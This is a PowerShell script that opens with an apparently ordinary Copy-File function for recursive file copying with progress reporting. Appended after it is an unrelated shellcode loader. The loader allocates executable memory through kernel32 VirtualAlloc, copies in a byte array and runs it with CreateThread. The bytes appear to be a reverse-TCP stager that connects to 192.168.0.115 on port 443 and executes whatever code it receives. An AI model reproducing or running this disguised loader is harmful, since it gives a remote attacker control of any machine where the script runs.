function Copy-File {param ([string]$Path,[string]$Destination,[switch]$Overwrite)$files = Get-ChildItem $Path -Recurse -File$source = (Resolve-Path (Split-Path $Path)).ProviderPath$Destination = (Resolve-Path $Destination).ProviderPath[long]$allbytes = ($files | measure -Sum length).Sum[long]$total1 = 0 $index = 0$filescount = $files.Count$sw1 = [System.Diagnostics.Stopwatch]::StartNew()foreach ($file in $files) {$filefullname = $file.fullname$index++$destdir = Join-Path $Destination $($(Split-Path $filefullname).Replace($source, ''))if (!(Test-Path $destdir)) {$null = md $destdir}$num = 1$base = $file.name -replace "$($file.extension)$"$ext = $file.extension$destfile = Join-Path $destdir "$base$ext"if (!$overwrite) {while (Test-Path $destfile) {$destfile = Join-Path $destdir "$base-$num$ext"$num++}}$ffile = [io.file]::OpenRead($filefullname)$DestinationFile = [io.file]::Create($destfile)$sw2 = [System.Diagnostics.Stopwatch]::StartNew()[byte[]]$buff = New-Object byte[] (4096 * 1024) [long]$total2 = [long]$count = 0do {$count = $ffile.Read($buff, 0, $buff.Length)$DestinationFile.Write($buff, 0, $count)$total2 += $count$total1 += $countif ($ffile.Length -gt 1) {$pctcomp2 = $total2 / $ffile.Length * 100} else {$pctcomp2 = 100}[int]$secselapsed2 = [int]($sw2.elapsedmilliseconds.ToString()) / 1000if ($secselapsed2 -ne 0) {[single]$xferrate = $total2 / $secselapsed2 / 1mb} else {[single]$xferrate = 0.0}if ($total % 1mb -eq 0) {if ($pctcomp2 -gt 0) {[int]$secsleft2 = $secselapsed2 / $pctcomp2 * 100 - $secselapsed2} else {[int]$secsleft2 = 0}$pctcomp1 = $total1 / $allbytes * 100[int]$secselapsed1 = [int]($sw1.elapsedmilliseconds.ToString()) / 1000if ($pctcomp1 -gt 0) {[int]$secsleft1 = $secselapsed1 / $pctcomp1 * 100 - $secselapsed1} else {[int]$secsleft1 = 0}$WrPrgParam1 = @{Id = 1Activity = "$('{0:N2}' -f $pctcomp1)% $index of $filescount ($($filescount - $index) left)"Status = $filefullnamePercentComplete = $pctcomp1SecondsRemaining = $secsleft1}Write-Progress @WrPrgParam1$WPparams2 = @{Id = 2Activity = (('{0:N2}' -f $pctcomp2) + '% Copying file @ ' + '{0:n2}' -f $xferrate + ' MB/s')Status = $destfilePercentComplete = $pctcomp2SecondsRemaining = $secsleft2}Write-Progress @WPparams2}} while ($count -gt 0)$sw2.Stop()$sw2.Reset()$ffile.Close()$DestinationFile.Close()}$sw1.Stop()$sw1.Reset()}$bccM = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $bccM -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x00,0x73,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$syZ=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($syZ.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$syZ,0,0,0);for (;;){Start-sleep 60};